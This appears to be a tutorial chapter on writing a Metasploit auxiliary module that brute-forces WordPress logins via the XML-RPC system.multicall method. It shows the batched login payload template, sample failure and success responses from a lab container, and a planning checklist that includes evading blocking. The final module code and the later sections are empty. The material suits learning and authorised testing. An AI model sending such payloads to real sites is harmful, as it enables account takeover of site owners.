# Auxiliary module


## Scanner 

Scanner basic modules

- S

### Wordpress XMLRPC Massive Bruteforce
Wordpress CMS framework support XMLRPC service to interact with almost all functions in the framework. Some functions require authentication. The main issues lies in the you can authenticate many times within the same request. Wordpress accepts about 1788 lines of XML request which allows us to send tremendous number of login tries in a single request.

```
<?xml version="1.0"?>
<methodCall>
<methodName>system.multicall</methodName>
<params>
 <param><value><array><data>
 
 
  <value><struct>
  <member>
    <name>methodName</name>
    <value><string>wp.getUsersBlogs</string></value>
  </member>
  <member>
    <name>params</name><value><array><data>
     <value><array><data>
      <value><string>"USER #1"</string></value>
      <value><string>"PASS #1"</string></value>
     </data></array></value>
    </data></array></value>
  </member>
  
  ...Snippet...

  <value><struct>
  <member>
    <name>methodName</name>
    <value><string>wp.getUsersBlogs</string></value>
  </member>
  <member>
    <name>params</name><value><array><data>
     <value><array><data>
      <value><string>"USER #1"</string></value>
      <value><string>"PASS #N"</string></value>
     </data></array></value>
    </data></array></value>
  </member>
  
  
</params>
</methodCall>
```
So from above you can understand how the XML request will be build. Now How the reply will be?
To simplify this we'll test a single user once with wrong password another with correct password to understand the response behavior 

**wrong password response**
```
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
        <array>
          <data>
            <value>
              <struct>
                <member>
                  <name>faultCode</name>
                  <value>
                    <int>403</int>
                  </value>
                </member>
                <member>
                  <name>faultString</name>
                  <value>
                    <string>Incorrect username or password.</string>
                  </value>
                </member>
              </struct>
            </value>
          </data>
        </array>
      </value>
    </param>
  </params>
</methodResponse>
```
We noticed the following 
- <name>faultCode</name>
- <int>403</int>
- <string>Incorrect username or password.</string>

Usually we rely one the string response '*Incorrect username or password.*', but what if the wordpress language wasn't English? so the best thing is the integer response which is `403`


**correct password response**
```
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
        <array>
          <data>
            <value>
              <array>
                <data>
                  <value>
                    <array>
                      <data>
                        <value>
                          <struct>
                            <member>
                              <name>isAdmin</name>
                              <value>
                                <boolean>1</boolean>
                              </value>
                            </member>
                            <member>
                              <name>url</name>
                              <value>
                                <string>http://172.17.0.3/</string>
                              </value>
                            </member>
                            <member>
                              <name>blogid</name>
                              <value>
                                <string>1</string>
                              </value>
                            </member>
                            <member>
                              <name>blogName</name>
                              <value>
                                <string>Docker wordpress</string>
                              </value>
                            </member>
                            <member>
                              <name>xmlrpc</name>
                              <value>
                                <string>http://172.17.0.3/xmlrpc.php</string>
                              </value>
                            </member>
                          </struct>
                        </value>
                      </data>
                    </array>
                  </value>
                </data>
              </array>
            </value>
          </data>
        </array>
      </value>
    </param>
  </params>
</methodResponse>
```
We noticed the a long reply with the result of called method `wp.getUsersBlogs`

Awesome, right?

The tricky part is just begun!
Since we will send thousands of passwords in one request and the reply will be rally huge xml files, how we'll find the position of the correct credentials? The answer is, by using the powerful ruby iteration methods, particularly `each_with_index` method.

Enough talk, it's show time!

#### What do we want?
- [ ] Create Auxiliary module
- [ ] Deal with Web Application 
- [ ] Deal with Wordpress 
- [ ] Describe The module
- [ ] Let people know we created this module
- [ ] Add references about the vulnerability that we exploit
- [ ] Options to set the target URI, port, user, pass list.
- [ ] Read username and password lists as arrays 
- [ ] Build/Generate XML file takes a user and iterate around the passwords
- [ ] Check if target is running wordpress 
- [ ] Check if target enabling RPC 
- [ ] Check if we got blocked
- [ ] Parsing the result and find which password is correct 

#### Wrapping up
The final module 

### DoS module 

### Server

